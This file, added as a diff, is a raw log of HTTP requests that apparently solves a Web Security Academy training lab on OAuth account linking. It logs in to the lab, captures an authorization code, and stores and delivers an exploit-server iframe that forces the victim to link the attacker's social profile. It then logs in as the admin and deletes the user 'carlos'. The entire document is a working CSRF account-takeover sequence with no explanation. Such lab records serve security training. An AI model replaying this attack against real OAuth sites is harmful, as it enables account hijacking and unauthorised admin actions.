@@ -1,0 +1,83 @@
+POST /login HTTP/1.1
+Host: ac1f1fb01fc1a50fc02faad4000600a1.web-security-academy.net
+Cookie: session=XoLb7U8SbKpfdoIEbRCmzhzrVzAlaI8U
+
+csrf=BQkr9zx0ZDfE6tcDAAW2lCAtoFLosywY&username=wiener&password=peter
+
+GET /my-account HTTP/1.1
+Host: ac1f1fb01fc1a50fc02faad4000600a1.web-security-academy.net
+Cookie: session=II922weiqxZWCVQjufefcnep8Iry2w3H
+
+GET /auth?client_id=kmpja1ucn8zba1oewc0ab&redirect_uri=https://ac1f1fb01fc1a50fc02faad4000600a1.web-security-academy.net/oauth-linking&response_type=code&scope=openid%20profile%20email HTTP/1.1
+Host: oauth-ac261f0e1f07a55fc077aa5102ea0043.web-security-academy.net
+
+GET /interaction/06Lpv7FJRA9tX5J66xJeg HTTP/1.1
+Host: oauth-ac261f0e1f07a55fc077aa5102ea0043.web-security-academy.net
+Cookie: _interaction=06Lpv7FJRA9tX5J66xJeg
+
+POST /interaction/06Lpv7FJRA9tX5J66xJeg/login HTTP/1.1
+Host: oauth-ac261f0e1f07a55fc077aa5102ea0043.web-security-academy.net
+Cookie: _interaction=06Lpv7FJRA9tX5J66xJeg
+
+username=peter.wiener&password=hotdog
+
+GET /auth/06Lpv7FJRA9tX5J66xJeg HTTP/1.1
+Host: oauth-ac261f0e1f07a55fc077aa5102ea0043.web-security-academy.net
+Cookie: _interaction_resume=06Lpv7FJRA9tX5J66xJeg
+
+GET /interaction/06Lpv7FJRA9tX5J66xJeg HTTP/1.1
+Host: oauth-ac261f0e1f07a55fc077aa5102ea0043.web-security-academy.net
+Cookie: _interaction=06Lpv7FJRA9tX5J66xJeg; _session=MVKt9rbY3q5PBNPOdUOwz; _session.legacy=MVKt9rbY3q5PBNPOdUOwz
+
+POST /interaction/06Lpv7FJRA9tX5J66xJeg/confirm HTTP/1.1
+Host: oauth-ac261f0e1f07a55fc077aa5102ea0043.web-security-academy.net
+Cookie: _interaction=06Lpv7FJRA9tX5J66xJeg; _session=MVKt9rbY3q5PBNPOdUOwz; _session.legacy=MVKt9rbY3q5PBNPOdUOwz
+
+GET /auth/06Lpv7FJRA9tX5J66xJeg HTTP/1.1
+Host: oauth-ac261f0e1f07a55fc077aa5102ea0043.web-security-academy.net
+Cookie: _interaction_resume=06Lpv7FJRA9tX5J66xJeg; _session=MVKt9rbY3q5PBNPOdUOwz; _session.legacy=MVKt9rbY3q5PBNPOdUOwz
+
+POST / HTTP/1.1
+Host: exploit-ac901fd61fb4a577c084aaa801de009f.web-security-academy.net
+
+urlIsHttps=on&responseFile=%2Fexploit&responseHead=HTTP%2F1.1+200+OK%0D%0AContent-Type%3A+text%2Fhtml%3B+charset%3Dutf-8&responseBody=%3Ciframe+src%3D%22https%3A%2F%2Fac1f1fb01fc1a50fc02faad4000600a1.web-security-academy.net%2Foauth-linking%3Fcode%3DgWd7gbD2aqggNfgLSzUjLtxXh4G5wHOYcUguwt5lAQr%22%3E%3C%2Fiframe%3E&formAction=STORE
+
+POST / HTTP/1.1
+Host: exploit-ac901fd61fb4a577c084aaa801de009f.web-security-academy.net
+
+urlIsHttps=on&responseFile=%2Fexploit&responseHead=HTTP%2F1.1+200+OK%0D%0AContent-Type%3A+text%2Fhtml%3B+charset%3Dutf-8&responseBody=%3Ciframe+src%3D%22https%3A%2F%2Fac1f1fb01fc1a50fc02faad4000600a1.web-security-academy.net%2Foauth-linking%3Fcode%3DgWd7gbD2aqggNfgLSzUjLtxXh4G5wHOYcUguwt5lAQr%22%3E%3C%2Fiframe%3E&formAction=DELIVER_TO_VICTIM
+
+GET /deliver-to-victim HTTP/1.1
+Host: exploit-ac901fd61fb4a577c084aaa801de009f.web-security-academy.net
+
+POST / HTTP/1.1
+Host: exploit-ac901fd61fb4a577c084aaa801de009f.web-security-academy.net
+
+urlIsHttps=on&responseFile=%2Fexploit&responseHead=HTTP%2F1.1+200+OK%0D%0AContent-Type%3A+text%2Fhtml%3B+charset%3Dutf-8&responseBody=%3Ciframe+src%3D%22https%3A%2F%2Fac1f1fb01fc1a50fc02faad4000600a1.web-security-academy.net%2Foauth-linking%3Fcode%3DgWd7gbD2aqggNfgLSzUjLtxXh4G5wHOYcUguwt5lAQr%22%3E%3C%2Fiframe%3E&formAction=ACCESS_LOG
+
+GET /log HTTP/1.1
+Host: exploit-ac901fd61fb4a577c084aaa801de009f.web-security-academy.net
+
+GET /auth?client_id=kmpja1ucn8zba1oewc0ab&redirect_uri=https://ac1f1fb01fc1a50fc02faad4000600a1.web-security-academy.net/oauth-login&response_type=code&scope=openid%20profile%20email HTTP/1.1
+Host: oauth-ac261f0e1f07a55fc077aa5102ea0043.web-security-academy.net
+Cookie: _session=qSTUVyW_b3jzFyH_fE02Z; _session.legacy=qSTUVyW_b3jzFyH_fE02Z
+
+GET /oauth-login?code=K-J7RDxNML6d3PcchEwh_6J23lXX_GobQrLuZEfbvGf HTTP/1.1
+Host: ac1f1fb01fc1a50fc02faad4000600a1.web-security-academy.net
+Cookie: session=oAGGQ1fVg8vBu9JNqeE3oqUHyW2sK0xR
+
+GET / HTTP/1.1
+Host: ac1f1fb01fc1a50fc02faad4000600a1.web-security-academy.net
+Cookie: session=5rhM66Kg0lJampnsaCXBmup3tHX6sT1b
+
+GET /admin HTTP/1.1
+Host: ac1f1fb01fc1a50fc02faad4000600a1.web-security-academy.net
+Cookie: session=5rhM66Kg0lJampnsaCXBmup3tHX6sT1b
+
+GET /admin/delete?username=carlos HTTP/1.1
+Host: ac1f1fb01fc1a50fc02faad4000600a1.web-security-academy.net
+Cookie: session=5rhM66Kg0lJampnsaCXBmup3tHX6sT1b
+
+GET /admin HTTP/1.1
+Host: ac1f1fb01fc1a50fc02faad4000600a1.web-security-academy.net
+Cookie: session=5rhM66Kg0lJampnsaCXBmup3tHX6sT1b
